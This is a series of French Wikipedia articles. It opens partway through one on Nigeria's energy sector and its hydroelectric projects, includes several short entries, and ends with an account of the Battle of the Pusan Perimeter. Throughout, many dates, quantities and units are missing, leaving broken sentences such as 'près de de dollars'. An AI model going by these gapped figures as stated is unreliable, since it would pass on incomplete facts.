Une "Nigerian Nuclear Regulatory Authority" (NNRA) a été créée pour la supervision réglementaire de tous les usages des rayonnements ionisants, des matériaux nucléaires et des sources radioactive sous l'autorité du Ministère fédéral des sciences et technologies. La "Nigerian Atomic Energy Commission" (NEAC) n'est placée sous l'autorité d'aucun ministère fédéral, et est responsable pour le "Nuclear Energy Program Implementation Committee" (NEPIC). En la NEAC a annoncé la sélection de quatre sites pour évaluation ultérieure par son équipe environnementale : près de Geregu/Ajaokuta dans l'état de Kogi (zone centrale), Itu dans l'état d'Akwa Ibom (sud-est), Agbaje, Okitipupa dans l'état d'Ondo (sud-ouest) et Lau dans l'état de Taraba (nord-est). La construction était envisagée à partir de 2014, et la mise en service en 2020. Les deux premiers sites, Geregu et Itu, ont été évalués en 2014-15 et confirmés comme prioritaires. Une licence préliminaire par la NNRA est attendue en 2016. Rosatom a déclaré s'attendre à ce que deux réacteurs soient construits sur chaque site.
En , la Russie a signé un accord de coopération avec le Nigeria prévoyant l'exploration et l'extraction de l'uranium dans le pays. Un accord-cadre de juin 2009 envisage la construction d'un réacteur électrogène russe et un nouveau réacteur de recherche. En Rosatom et la "Nigerian Atomic Energy Commission" ont finalisé un projet d'accord intergouvernemental pour coopérer sur le design, la construction, l'exploitation et la déconstruction d'une centrale nucléaire initiale. Trois centrales nucléaires supplémentaires sont prévues, portant le coût total à près de de dollars. En Rosatom a signé un protocole d'accord avec la NAEC pour préparer un programme complet de construction centrales nucléaires au Nigeria, incluant le développement de l'infrastructure et un système de régulation pour la sûreté nucléaire. Rosatom a confirmé que des solutions de financement russes seront proposées au Nigeria, dont l'option préférée est un arrangement de type « "build-own-operate (BOO)" » (construction-propriété-exploitation) avec la majorité du capital pour Rosatom. Au début 2015 l'intention était de mettre en service une première unité en 2025 et en fonctionnement en 2035.
Après une évaluation de concepts américains par la "Nigerian Nuclear Regulatory Authority" (NNRA) en 2009, le gouvernement de l'état d'Imo a signé un accord avec "Barnett Holding Co" pour étudier des sites pour des réacteurs nucléaires modulaires, utilisant les directives de l'IAEA. Ces réacteurs devaient être de 5 à , déployés dans un quartier d'Owerri, Ogwu city, et ailleurs dans l'état d'Imo.
Énergies renouvelables.
Le Plan directeur pour l'énergie renouvelable ("Renewable Energy Master Plan" - REMP) lancé en 2011 par le Ministère fédéral de l'environnement fixe l'objectif de porter la part des énergies renouvelables dans la production d'électricité de 13 % en 2015 à 23 % en 2025 et 36 % en 2030, ce qui porterait à 10 % en 2025 la part de l'électricité renouvelable dans la consommation totale d'énergie. Ce plan fixe également des objectifs de puissance installée par énergie :
Il prévoit aussi de porter le taux d'électrification de 42 % en 2005 à 60 % en 2015 et 75 % en 2025. Pour réaliser ces objectifs, il prévoit à court terme un moratoire sur les taxes à l'importation pour les technologies à énergies renouvelables, et à plus long terme des déductions fiscales, des incitations à l'investissement et des prêts à taux réduits.
Pour favoriser l'essor de l'énergie solaire, le gouvernement nigérian impose en aux compagnies de distribution d'électricité de se fournir à 50 % en énergie renouvelable. En effet, une série d'accords conclus entre gouvernement et entreprises porte le total des projets de construction de centrales solaires à fin 2015.
Hydroélectricité.
La production hydroélectrique du Nigeria a atteint en 2021, au en Afrique avec 5,5 % de la production africaine, loin derrière la Zambie : et le Mozambique : . La puissance installée des centrales hydroélectriques du Nigeria totalisait fin 2021, soit 5,5 % du total africain, au , loin derrière l'Éthiopie () et l'Angola (). La première unité de de la centrale de Zungeru a été mise en service en 2022 ; à son achèvement, cette centrale fournira .
Le barrage Kainji sur le fleuve Niger, construit de 1962 à 1968, alimente une centrale de .
Le barrage de Jebba sur le fleuve Niger, mis en service en 1984, alimente une centrale de .
La centrale de Shiroro (), sur la rivière Kaduna, affluent du Niger, a été mise en service en 1990.
La mise en service de la centrale de Zungeru (), en construction depuis 2013, initialement prévue en décembre 2021, a pris du retard. Sa première turbine de entre en service au premier trimestre 2022. En novembre 2022, le gouvernement organise un appel d’offres pour la concession de l'exploitation et l'entretien de la centrale pendant . Les travaux sur le projet doivent s’achever au premier trimestre 2023. Le barrage, d’une hauteur de et long de , est construit sur la rivière Kaduna, un affluent du fleuve Niger, par un consortium chinois composé de Sinohydro et China National Electric Engineering Company (CNEEC). Le réservoir est stocker (milliards de m) d’eau. La production prévue est de par an.
Le projet Gurara II (), sur la rivière Gurara dans l'État de Kaduna, au centre du Nigeria, est en développement par le ministère fédéral des ressources en eau, qui prévoit de lancer le chantier en 2023 pour une mise en service en 2026. Sa production annuelle est estimée à . L'exploitation devrait être concédée à Sinohydro. Le gouvernement fédéral a approuvé en mai 2019 un prêt de de la banque chinoise EXIM Bank pour le développement du projet. La centrale Gurara I () produit déjà de l'électricité et fournit de l'eau pour l'irrigation du nord du pays.
Le projet hydroélectrique de Mambilla (), sur la rivière Dongo dans l’État de Taraba, comprend la construction de quatre barrages et de deux centrales souterraines avec chacune six groupes turbine-alternateur de . L'électricité produite par l'installation sera transmise au réseau national par quatre lignes de transport à courant continu de , d'une longueur totale de . Le coût du projet est estimé à , financés à 85 % par l'EXIM Bank et 15 % par le gouvernement fédéral du Nigeria. Le projet, conçu à l'origine en 1972, n'a réellement commencé à se réaliser qu'en 2007 avec la signature d'un contrat avec le groupe chinois Gezhouba pour le développement d'un projet de , porté à en 2012. En 2017, le ministère fédéral nigérian des travaux d'électricité et du logement attribue le contrat d'ingénierie, d'approvisionnement et de construction (EPC) du projet à un consortium composé de Sinohydro, société d'ingénierie et de construction hydroélectrique appartenant à l'État chinois, China Gezhouba Group, et Société chinoise de géo-ingénierie. Mais le chantier est interrompu en novembre 2017 à la suite d'un contentieux entre le gouvernement nigérian et la société nigériane Sunrise Power and Transmission Company Limited (SPTCL), qui affirme avoir obtenu le contrat de construction, d’exploitation et de transfert en 2003, avant une défection du gouvernement. En février 2020, un accord d’arbitrage est conclu pour régler le différend à l’amiable : le gouvernement accepte de verser à la société SPTCL pour rupture de contrat. Mais en mai 2021, le gouvernement n'ayant pas payé, SPTCL dépose une autre plainte auprès du Chambre internationale du commerce à Paris. En novembre 2021, SPTCL accepte de renoncer aux pénalités de encourus par le gouvernement fédéral pour ses manquements.
Le Nigeria prévoyait en 2014 de porter d'ici 2020 à la capacité des centrales hydroélectriques, soit presque un triplement de la capacité de 2012 : . Ces plans prévoyaient de réhabiliter les centrales hydroélectriques existantes et d'en construire de nouvelles : Gurara II (), Zungeru () et Mambilla (). Fin 2013, le gouvernement a annoncé un accord de avec la Chine pour réaliser le projet de Zungeru. L"'Export-Import Bank of China" couvrira 75 % du coût et le gouvernement nigérian financera le reste. Le projet était initialement programmé pour une mise en service en 2017, mais cette date a été repoussée à cause de problèmes juridiques.
Solaire.
Le gouvernement projette d'accroître l'utilisation de l'énergie solaire ; SkyPower FAS Energy, une joint venture entre SkyPower Global et FAS Energy, a signé en des accords avec le gouvernement fédéral du Nigeria et le gouvernement de l'état du Delta pour le développement, la construction et l'exploitation de de centrales solaires photovoltaïques pour un coût estimé de de dollars sur cinq ans. Un régime de tarif d'achat réglementé ("feed-in tariff" - FIT) est en préparation pour soutenir l'investissement dans les énergies renouvelables.
Il est prévu l'ouverture d'une première ferme photovoltaïque de en 2017.
Consommation finale d'électricité.
La consommation d'électricité par habitant au Nigeria était de en 2021, soit seulement 3 % de la moyenne mondiale () et 17 % de la moyenne africaine ().
Le taux d'électrification au Nigeria est estimé à 41 % en 2013, laissant près de de nigérians sans accès à l'électricité.
La répartition par secteur de la consommation finale d'électricité a évolué comme suit :
Impact environnemental.
Émissions de gaz à effet de serre liées à l'énergie.
Les estimations de l'Agence internationale de l'énergie détaillées ci-dessous incluent l'ensemble des émissions de gaz à effet de serre liées à l'énergie (, , etc)
Émissions de liées à l'énergie.
Les émissions de liées à l'énergie par habitant sont très faibles : en 2022, soit 10,7 % de la moyenne mondiale () et 52 % de la moyenne africaine (). Mais elles progressent cinq fois plus vite que la moyenne mondiale : +53 % contre +10,6 % entre 1990 et 2022.
Pollution de l'eau et des sols par les hydrocarbures.
Des groupes locaux cherchant à s'approprier une part des richesses attaquent fréquemment les infrastructures, forçant les compagnies à déclarer la force majeure sur des cargaisons de pétrole. De plus, les vols de pétrole causent des dommages, souvent graves, aux oléoducs, causant des pertes de pétrole, des pollutions et des arrêts de production. Des infrastructures vieillissantes et le manque de maintenance ont aussi causé des marées noires. Les protestations de groupes locaux contre ces dommages environnementaux ont exacerbé les tensions entre certaines communautés locales et les compagnies pétrolières internationales. L'industrie a été blâmée pour la pollution de l'air, des sols et de l'eau, causant de pertes de terres arables et de ressources halieutiques.
Le Programme des Nations unies pour l'environnement (PNUE) prévoyait en 2012 qu'il faudrait 25 à pour dépolluer le delta, dans la plus vaste opération de nettoyage jamais réalisée. Shell a reconnu en son rôle dans deux marées noires survenues en 2008 et 2009, s'engageant à payer des compensations. En , janvier, le tribunal de La Haye a rejeté quatre des cinq plaintes de fermiers et pêcheurs nigérians, qui accusaient une filiale de Shell d'avoir pollué leur village, terres et étangs, à cause de fuites dans un oléoduc. Ces dégâts ont été reconnus, mais la justice néerlandaise a relevé que dans la loi nigériane, la société-mère de Shell, basée à La Haye, n'a aucune obligation d'empêcher ses filiales, Shell Nigeria en l'occurrence, « de faire du tort à des tiers ». L'une des cinq plaintes a par contre été retenue contre cette filiale, condamnée à payer des dédommagements pour deux fuites de pétrole survenues en 2006 et 2007 près du village d'Ikot Ada Udo, proche du delta du Niger. Si le tribunal a considéré que ces fuites étaient dues aux sabotages liés aux vols de pétrole, il a néanmoins estimé que Shell Nigeria aurait dû prendre des mesures pour y remédier. Shell s'est de son côté félicitée d'avoir été blanchie en tant que société-mère ; elle nie toute responsabilité dans les fuites, assurant que la pollution pétrolière dans le delta du Niger est due en grande partie au détournement du pétrole qui coule dans les oléoducs, le "bunkering", qui a capté en 2012 environ un cinquième de la production nationale de pétrole, selon le ministre nigérian des finances. La compagnie affirme que de pétrole se sont déversés dans le delta du Niger en 2012, soit 70 % de plus que l'année précédente. Mutiu Sunmonu, patron du groupe au Nigeria, affirmait à l'AFP en 2011 que . D'après le blog environnement du Guardian toutefois, bien que les habitants admettent ouvrir de petites raffineries locales « pour survivre », .
Pollution de l'air.
L'utilisation quasi-générale du bois ou de déchets végétaux pour la cuisson est une source majeure de pollution : l'Organisation mondiale de la santé évalue la mortalité due à la pollution de l'air intérieur en 2012 à pour en Afrique, ce qui donne pour le Nigeria une estimation de près de .
Le torchage du gaz naturel a contribué à la pollution atmosphérique.

</doc>
<doc id="9412948" url="https://fr.wikipedia.org/wiki?curid=9412948" title="Susanne Grainger">
Susanne Grainger

Susanne Grainger, née le , est une rameuse canadienne.

</doc>
<doc id="9412950" url="https://fr.wikipedia.org/wiki?curid=9412950" title="Rue Sainte-Marthe (ancienne voie de Paris)">
Rue Sainte-Marthe (ancienne voie de Paris)

La rue Sainte-Marthe est une ancienne voie de Paris, aujourd'hui disparue, située dans l'ancien (actuel ).
Situation.
Longue de , elle reliait le passage Saint-Benoît à la rue Childebert (voies disparues).
Histoire.
Elle est ouverte en 1715 dans l'enclos de l'abbaye de Saint-Germain-des-Prés en même temps que la rue d'Erfurth et la rue Childebert par Henri-Pons de Thiard de Bissy, abbé commendataire. Elle est nommée en l'honneur de Denis de Sainte-Marthe, professeur de philosophie et de théologie à l'abbaye et supérieur général de la congrégation de Saint-Maur. Les immeubles de rapport sont construits par Victor-Thierry Dailly.
Une décision ministérielle du et une ordonnance royale du ont fixé la largeur de cette rue à . La rue est supprimée dans le cadre du prolongement de la rue de Rennes et de la création du boulevard Saint-Germain, décidée par le décret du .

</doc>
<doc id="9412952" url="https://fr.wikipedia.org/wiki?curid=9412952" title="Jo Grimond">
Jo Grimond

Joseph Grimond est un homme politique britannique né le à St Andrews et mort le à Glasgow. Il appartient au Parti libéral, qu'il dirige de 1956 à 1967, puis au cours d'un bref intérim en 1976 à la suite de la démission de Jeremy Thorpe, pris dans un scandale judiciaire.
Il est élu député à la Chambre des communes pour la circonscription d'Orkney and Shetland en 1950 et conserve son siège jusqu'aux élections de 1983, où il ne se représente pas. Il est titré pair à vie la même année, devenant « baron Grimond de Firth dans le comté d'Orkney ».
Retraite et décès.
Après avoir quitté la Chambre des communes, il est créé pair à vie sous le nom de Baron Grimond, of Firth in the County of Orkney le 12 octobre 1983. Il reste attaché à son ancienne circonscription parlementaire et est enterré à Finstown, sur l'île d'Orkney.

</doc>
<doc id="9412953" url="https://fr.wikipedia.org/wiki?curid=9412953" title="Fête de la Sainte Piété">
Fête de la Sainte Piété

La Fête de la Sainte Piété (en italien, "Festa della Santissima Pietà" ou "Festa dei Lumineri") est une fête catholique célébrée chaque année le soir du 7 janvier à Cannobio, dans la province du Verbano-Cusio-Ossola, au Piémont, dans le nord de l'Italie.
Le rituel.
Le rituel consiste en porter en procession le reliquaire contenant une côte de Jésus (appelé "la Sainte Côte") jusqu'au Sanctuaire de la Santissima Pietà. Le fidèles baisent le reliquaire lorsqu'il passe.
La légende.
Selon la légende, les 8, 9, 10 et dans la taverne de Tommaso Zaccheo à Cannobio se produisirent des miracles.
Une femme de chambre, montée au premier étage pour prendre des draps propres, vit la petite peinture du "Christ de douleur", représentant Jésus entre la Vierge et saint Jean, saigner. Le jour suivant une petite côte sanglante, de même proportion que le Christ de la peinture, fut trouvée sous la celle-ci.
La sainte côte fut placée dans une coupe et transportée à l'église San Vittore, où elle est conservée dans un précieux reliquaire donné en 1605 par Federico Borromeo, cardinal archevêque de Milan de 1595 à 1631.
La taverne fut détruite pour permettre la construction d'un majestueux sanctuaire, dont la construction fut soutenue par saint Charles Borromée. Le sanctuaire garde encore la peinture et les draps tachés de sang.
La fête.
La partie laïque de la fête consiste dans l'illumination de la ville avec des bougies. Chaque habitant met une bougie sur le rebord de la fenêtre ou sur les bateaux sur le lac.
Après la procession les fidèles mangent traditionnellement le « menu pauvre », composé des "pasta e fagioli" (pâtes et haricots) et de la "", une saucisse de bœuf avec de l'ail servie avec des pommes de terre bouillies et du chou.

</doc>
<doc id="9412957" url="https://fr.wikipedia.org/wiki?curid=9412957" title="Malgorzata Jasinska">
Malgorzata Jasinska



</doc>
<doc id="9412960" url="https://fr.wikipedia.org/wiki?curid=9412960" title="Ford (Sussex de l'Ouest)">
Ford (Sussex de l'Ouest)

 est un village et une paroisse civile anglaise situé dans le district d'Arun dans le comté du Sussex de l'Ouest. En 2011, sa population était de .

</doc>
<doc id="9412973" url="https://fr.wikipedia.org/wiki?curid=9412973" title="Bataille du périmètre de Busan">
Bataille du périmètre de Busan

La bataille du périmètre de Busan (ou « poche de Pusan » ou « réduit de Pusan ») oppose les forces armées de l'ONU à celles de la Corée du Nord. Elle se déroule du au et marque l'un des premiers grands engagements de la guerre de Corée. L'armée de l'ONU, au bord de l'effondrement, rassemble dans un périmètre restreint autour de Busan afin de résister et de contrer l'invasion de l'armée nord-coréenne, forte de .
Les forces de l'ONU, après avoir été défaites à plusieurs reprises lors de l'avancée des Nord-Coréens, sont acculées dans le périmètre de Busan, une ligne défensive de autour d'une zone à la pointe sud de la péninsule coréenne comprenant le port de Busan. Les troupes de l'ONU, composées principalement de forces sud-coréennes, américaines et britanniques, montent une dernière ligne de défense autour du périmètre. La lutte contre les attaques nord-coréennes dure près de six semaines, et s'est principalement déroulée autour des villes de Daegu, Masan, et Pohang, et du fleuve Nakdong. Les assauts massifs nord-coréens échouent à percer le périmètre, en dépit de deux grandes poussées en août et septembre.
Les troupes nord-coréennes, entravées par des pénuries d'approvisionnement et des pertes massives, poursuivent leurs attaques incessantes contre les forces de l'ONU, espérant pénétrer le périmètre et provoquer l'effondrement des lignes. Cependant, le port de Busan représente un avantage écrasant en permettant à l'ONU de se ravitailler continuellement en troupes, équipements et logistiques. La protection de la zone est, de plus, assurée par la marine américaine et un appui aérien constant dont la domination ne peut être contestée par les Nord-coréens. Après six semaines de combat, les forces de la Corée du Nord sont laminées et doivent se retirer dans la défaite après la contre-attaque d'Incheon, lancée par les forces des Nations unies le . Cette bataille représente la poussée la plus forte des troupes nord-coréennes, alors que les combats ultérieurs n'auront pour résultat que de conduire la guerre dans une impasse.
Contexte.
Déclenchement du conflit.
Après le déclenchement de la guerre de Corée, l'Organisation des Nations unies décide d'engager des troupes à l'appui de la République de Corée (Corée du Sud), qui vient d'être envahi par la République démocratique populaire de Corée (Corée du Nord). Les États-Unis envoient des forces terrestres dans la péninsule coréenne dans le but de riposter à cette invasion nord-coréenne et empêcher l'effondrement de la Corée du Sud. Cependant, les forces américaines en Extrême-Orient sont en baisse constante depuis la fin de la Seconde Guerre mondiale, cinq ans plus tôt, et les forces les plus proches se résument à la d'infanterie de la américaine, dont le quartier général se trouve au Japon. La division est en sous-effectif et la plupart de ses équipements sont obsolètes en raison des réductions des dépenses militaires. Malgré cela, la d'infanterie mécanisée est envoyée en Corée du Sud.
La d'infanterie mécanisée est la première unité américaine envoyée en Corée. Elle a pour mission d'encaisser le choc initial de la poussée nord-coréenne et de retarder ses unités afin de gagner du temps et permettre aux restes des troupes d'arriver. La division est par conséquent seule pendant plusieurs semaines à tenter de retarder les Nord-Coréens afin de permettre à la d'infanterie, la d'infanterie, la de cavalerie, et aux autres unités de la de se mettre en position.
Des éléments avancés de la d'infanterie (la Task-Force Smith) sont sévèrement battus à la bataille d'Osan le , premier affrontement entre les forces américaines et nord-coréennes. Dans le premier mois suivant la défaite de la "", la d'infanterie est battue à plusieurs reprises et forcée de se replier au sud par les forces nord-coréennes supérieures en nombre et en qualité d'équipement. Les régiments de la d'infanterie sont systématiquement repoussés au sud dans les batailles autour de Chochiwon, Cheonan et Pyeongtaek. La d'infanterie arrête sa retraite à la bataille de Daejeon, au prix de sa quasi-destruction et parvient à contenir les forces nord-coréennes jusqu'au . À cette date, les forces de la sont à peu près égales aux forces nord-coréennes présentes dans la région, mais avec de nouvelles unités de l'ONU arrivant chaque jour.
Avancée nord-coréenne.
Les forces armées des États-Unis, déjà épuisées par les deux précédentes semaines de combats à endiguer l'avancée des Nord-Coréens et qui tentent de défendre les quartiers généraux de la d'infanterie , sont submergées par les forces numériquement supérieures de l'Armée populaire de Corée à Daejeon. Après une féroce lutte de trois jours , les Américains doivent se retirer de Daejeon . Après avoir pris Daejeon, les forces nord-coréennes commencent à manœuvrer autour du périmètre de Busan dans une tentative d'encerclement. Les et d'infanterie nord-coréennes progressent vers le Sud dans un large mouvement. Les deux divisions manœuvrent de manière coordonnée afin d'envelopper le flanc gauche de l'ONU. Elles avancent sur les positions de l'ONU, en repoussant de manière répétée les forces américaines et sud-coréennes.
À l'Est, l'armée nord-coréenne, forte de , avance en Corée du Sud sur six colonnes, elle prend l'armée de la République de Corée par surprise et qui est complètement mise en déroute. La petite armée sud-coréenne souffre d'un manque généralisé d'organisation et d'équipement, et elle est très mal préparée à la guerre. Les forces nord-coréennes numériquement supérieures détruisent la résistance isolée des sud-coréens sur le front avant de continuer progressivement au sud. La plupart des forces de la Corée du Sud se retirent alors devant l'avancée nord-coréenne. Il ne faut que trois jours aux troupes nord-coréennes pour prendre la capitale Séoul, le , forçant le gouvernement et ses forces brisées à se retirer plus au sud. En outre, les forces sud-coréennes font sauter le pont sur la rivière Han, piégeant leurs propres soldats et tuant des centaines de réfugiés qui évacuent la ville. Bien qu'elles soient constamment repoussées, les forces sud-coréennes renforcent leur résistance au fur et à mesure de leur retraite vers le Sud, dans l'espoir de retarder les nord-coréens autant que possible. Les unités nord et sud-coréennes se battent pour le contrôle de plusieurs villes, s'infligeant de lourdes pertes. L'armée sud-coréenne défend farouchement Yeongdeok avant d'être refoulée, et réussit à repousser les forces nord-coréennes à la .
À l'Ouest, les forces américaines sont repoussées à plusieurs reprises, avant de finalement freiner l'avancée nord-coréenne. Des éléments du , du d'infanterie américain, nouvellement arrivés dans le pays, sont anéantis à Hadong dans une des forces nord-coréennes le , qui laisse un passage ouvert vers la zone de Busan. Peu de temps après, Chinju à l'Ouest est prise, repoussant le d'infanterie et laissant ouvert le passage vers Busan. Les unités américaines sont cependant en mesure de vaincre et de repousser les Nord-Coréens sur le flanc à la bataille de la Notch, le . Les pertes très élevées contraignent les forces nord-coréennes à se retirer sur le flanc ouest pendant plusieurs jours pour se rééquiper et recevoir des renforts. Ce répit de plusieurs jours permet aux belligérants de se préparer à l'attaque sur le périmètre de Busan.
Prélude.
Terrain.
Les forces de l'ONU établissent un périmètre autour de la ville portuaire de Busan tout au long des mois de juillet et août 1950. D'environ de long, le périmètre s'étend du détroit de Corée à la mer du Japon à l'Ouest et au nord de Busan. Sauf sur les les plus au sud où elle tourne vers l'Est à l'intérieur du périmètre après sa confluence avec la rivière Nam, l'ouest du périmètre est bordé par le fleuve Nakdong qui forme un coude au niveau de la ville de Daegu. La limite nord est une ligne irrégulière qui court à travers les montagnes au-dessus de Waegwan et Andong jusqu'à Yeongdeok.
À l'exception du delta du Nakdong au sud, et de la vallée entre Daegu et Pohang, le terrain est très accidenté et montagneux. Au Nord-est de Pohang, le terrain est particulièrement difficile, et les mouvements dans la région sont extrêmement périlleux. Ainsi, l'ONU établit le périmètre de Busan sur une position circonscrite par la mer du Japon, au sud et à l'Est, du fleuve Nakdong à l'Ouest, et des terrains très montagneux au nord, en utilisant le terrain comme défense naturelle. Cependant, le terrain accidenté rend également les communications difficiles, en particulier pour les forces sud-coréennes dans la région Pohang.
Les forces de l'ONU dans cette région souffrent également de pertes liées à la chaleur de l'été. En effet, la région du Nakdong ne dispose que de peu de végétation et d'eau potable et la Corée souffre d'une grave sécheresse à l'été 1950, ne recevant que de pluie contre en temps normal pendant les mois de juillet et août. Combiné avec des températures de , ce temps chaud et sec contribue au grand nombre de victimes, en particulier pour les forces américaines non conditionnées.
Forces en présence.
L'Armée populaire de Corée est organisée à l'origine en une force combinée et mécanisée de dix divisions avec bien entraînés et bien équipés et plusieurs centaines de chars T-34. Mais, les actions défensives menées par les forces sud-coréennes et américaines avant la bataille du périmètre de Busan lui ont déjà coûté et un grand nombre de chars. Pour compenser ces pertes, la Corée du Nord est obligée de compter sur des troupes moins expérimentées et des conscrits, dont beaucoup ont été enrôlés depuis les régions conquises de la Corée du Sud. Au cours de la bataille, les Nord-Coréens engagent un total de 13 divisions d'infanterie et une division blindée pour combattre au périmètre de Busan.
Les forces des Nations unies sont organisées sous le commandement de l'United States Army. La des États-Unis fait office de commande pour les forces de l'ONU, et son quartier général est basé à Daegu. Elle dispose de trois divisions américaines ; la d'infanterie a débarqué dans le pays début juillet, tandis que la d'infanterie et la de cavalerie sont arrivées entre le 14 et le 18 juillet. Ces forces occupent le tronçon ouest du périmètre, le long du fleuve Nakdong. L'armée de la République de Corée, une force de , est organisée en deux corps et cinq divisions. D'est en ouest, le d'armée sud-coréen comprend la d'infanterie et la division Capitale tandis que le d'armée contrôle les et d'infanterie. Une d'infanterie reconstituée est placée sous le contrôle direct de l'armée sud-coréenne. Le moral parmi les unités de l'ONU est faible en raison du grand nombre de défaites subies à ce stade de la guerre. Les forces américaines ont déjà subi plus de au cours du mois passé, tandis que l'armée sud-coréenne a perdu environ .
Le nombre réel de soldats de chaque côté est difficile à estimer. À la date du 5 août, l'armée nord-coréenne aligne environ en face du périmètre à Busan. Mais la plupart de ses divisions sont en sous-effectif. Et les unités mécanisées disposent sans doute de moins de et autour de 40 chars T-34 sur le front, en raison d'importantes pertes à cette date du conflit. MacArthur rapporte disposer de en Corée le 4 août, dont pour les unités de combat terrestres américaines et dans les unités de combat sud-coréennes. Ainsi, les forces de combat terrestre de l'ONU dépassent de à les forces nord-coréennes. Les forces des Nations unies ont le contrôle complet de l'air et de la mer, et des éléments de l'US Air Force et de l'US Navy fournissent un appui pour les unités terrestres tout au long de la bataille, pratiquement sans opposition. Le commandement général de la force navale est assumé par la des États-Unis, qui constitue aussi l'essentiel de la puissance navale fournie. Le Royaume-Uni fournit également une petite force navale y compris un porte-avions, le et plusieurs croiseurs. L'Australie, le Canada, les Pays-Bas et la Nouvelle-Zélande ont participé aussi par l'envoi de quelques navires. Plusieurs centaines de chasseurs-bombardiers de la Air Force sont positionnés juste à côté de la côte et à bord de l' et l'. À la fin de la bataille, la dispose d'un soutien aérien plus important que le d'armée du général Omar Bradley en Europe pendant la Seconde Guerre mondiale.
Du sud au nord, les unités nord-coréennes placées en face des unités de l'ONU sont le motorisé de la blindée, puis les , , , , , , , , , et d'infanterie ainsi que le d'infanterie indépendant. Tout au long de septembre 1950, alors que la bataille fait rage, davantage de forces de l'ONU arrivent des États-Unis et d'autres pays. La d'infanterie, le d'infanterie, la d'infanterie des Marines et la d'infanterie du Commonwealth débarquent à Busan avec un grand nombre de troupes fraîches et d'équipements supplémentaires, y compris plus de 500 chars. Vers la fin de la bataille, la force de la est passée de trois divisions en sous-effectif et sous-équipée à quatre divisions parfaitement préparées et prêtes au combat.
Logistique.
Nations unies.
Le juillet, le commandement américain en Extrême-Orient ordonne à la des États-Unis d'assumer la responsabilité de tout le soutien logistique des forces américaines et de l'ONU en Corée, y compris pour l'armée sud-coréenne. Pour ce faire, elle doit faire venir l'approvisionnement depuis les États-Unis et le Japon. Et le rééquipement de l'armée sud-coréenne représente pour les forces de l'ONU de grands problèmes logistiques courant juillet. Le plus grand défi est la pénurie de munitions. Bien que la situation logistique s'améliore au fil du temps, l'approvisionnement en munitions demeure un problème durant une grande partie de la guerre. De plus, la consommation de fournitures diffère entre les différentes unités et comme aucun plan n'avait été précédemment élaboré, cela force les logisticiens de l'ONU à créer un système à partir de rien. L'approvisionnement en nourriture pour les troupes en Corée est un autre défi logistique auquel sont confrontés les Nations unies dans les premiers jours de la guerre. Il n'y avait pas de ration C en Corée et seulement une petite réserve disponible au Japon au début de la guerre. Le Quartier-maître général de l'US Army commence donc immédiatement à déplacer tous les stocks de rations B et C disponibles des États-Unis en Extrême-Orient. Les premières rations de terrain sont en grande partie des rations K de la Seconde Guerre mondiale. L'approvisionnement en nourriture des troupes sud-coréennes est un problème tout aussi important et difficile.
La majorité du ravitaillement par mer est menée par des cargos de l'US Army et de l'US Navy. Le besoin massif de navires contraint l'ONU à affréter des bateaux privés et à réactiver des navires de la flotte de réserve pour augmenter le nombre des navires militaires en service. L'ONU dispose d'un avantage majeur dans ses opérations de transport maritime car le port le plus développé en Corée est Busan à la pointe sud de la péninsule. Busan est le seul port en Corée du Sud qui a des installations portuaires assez grandes pour gérer une quantité considérable de marchandises. Un pont aérien d'urgence depuis les États-Unis et le Japon, est aussi mis en place presque immédiatement afin de parer au manque d'éléments les plus critiques. Bien qu'il n'ait pas directement volé en Corée, le Military Air Transport Service, Division Pacifique, se développe rapidement après le déclenchement de la guerre. Soldats et fournitures sont convoyés vers les aérodromes situés sur le périmètre de Busan depuis le Japon par le Far East Air Forces transports. La consommation d'essence tant par les avions de combat que de transport est si importante dans la première phase de la guerre, qu'elle pèse très lourdement dans les stocks très limités de carburant disponibles en Extrême-Orient, devenant un problème logistique très sérieux. Depuis Busan une bonne voie ferrée construite par les Japonais et bien lesté de pierres concassées et de gravier de rivière s'étend vers le Nord. Les chemins de fer sont l'épine dorsale du système de transport de l'ONU en Corée. Les de routes coréennes sont toutes de nature secondaire selon les normes américaines ou européennes.
Corée du Nord.
La responsabilité de la logistique nord-coréenne est divisée entre le ministère de la Défense nationale (MDN), dirigé par le maréchal Choi Yong-kun, et le Service arrière de l'armée populaire de Corée, commandée par le général Choe Hong Kup. Le MDN est principalement responsable de l'approvisionnement et du transport par chemin de fer, tandis que le Service arrière est responsable du transport routier. Les Nord-Coréens s'appuient sur un système logistique très faible et bien plus petit que celui mis en place par le commandement des Nations unies en Corée. Ce réseau logistique n'est donc pas capable de déplacer autant de fournitures que ce dernier, et cela entraîne des difficultés considérables pour les troupes en première ligne. Basé sur le modèle soviétique, ce réseau basé uniquement au sol s'appuie principalement sur les chemins de fer pour transporter l'approvisionnement à l'avant tandis que les troupes transportent le ravitaillement aux unités en première ligne à pied ou en camions. Bien que plus polyvalent, ce dernier a aussi des inconvénients importants car moins efficace et souvent trop lent pour suivre les unités de première ligne en mouvement.
À la mi-juillet, le Far East Air Force Bomber Command (FEAF) commence une campagne soutenue et croissante contre des cibles logistiques stratégiques nord-coréennes. Le premier de ces objectifs est Wonsan, sur la côte Est. Wonsan est un important centre de communications qui relie Vladivostok en Sibérie à la Corée du Nord par le rail et par la mer. De là, des lignes de chemin de fer rejoignent tous les centres de la Corée du Nord. Dans la première partie de la guerre, la plus grande partie de l'approvisionnement russe pour la Corée du Nord arrive à Wonsan, et dès le début la cité est considérée comme une cible militaire majeure. Le 27 juillet, les plans du Bomber Command FEAF pour détruire l'approvisionnement ferroviaire et réduire le flux des troupes nord-coréennes vers le Sud sont prêts. La destruction des ponts ferroviaires à P'yong-yang et Hamhung et des gares de triage à P'yong-yang, Hamhung et Wonsan doit permettre de rompre complètement le réseau logistique ferroviaire de la Corée du Nord. Et la destruction des ponts ferroviaires sur le fleuve Han, près de Séoul doit couper la communication ferroviaire avec la zone du périmètre de Busan. Deux jours après l'identification des cibles ferroviaires, un plan similaire est mis en action pour le réseau routier. Le 4 août, les B-29 commencent leur mission contre tous les ponts clés au nord du et, le 15 août, les bombardiers légers et les chasseurs-bombardiers rejoignent la campagne de bombardement. L'absence de grandes pistes d'atterrissage et d'aéronefs ne permet pas à la Corée du Nord d'effectuer des ravitaillements aériens significatifs ; pour l'essentiel en provenance de Chine. L'aviation ne joue donc quasiment aucun rôle dans la logistique nord-coréenne. Les Nord-Coréens ne sont pas non plus en mesure d'utiliser efficacement le transport maritime. Les ports de Wonsan et d'Hungnam auraient pu être utilisés pour le transport de troupes et de matériel, mais ils sont restés trop peu développés pour supporter des mouvements logistiques à grande échelle, et il est difficile de naviguer dans le port d'Incheon avec un grand nombre de navires.
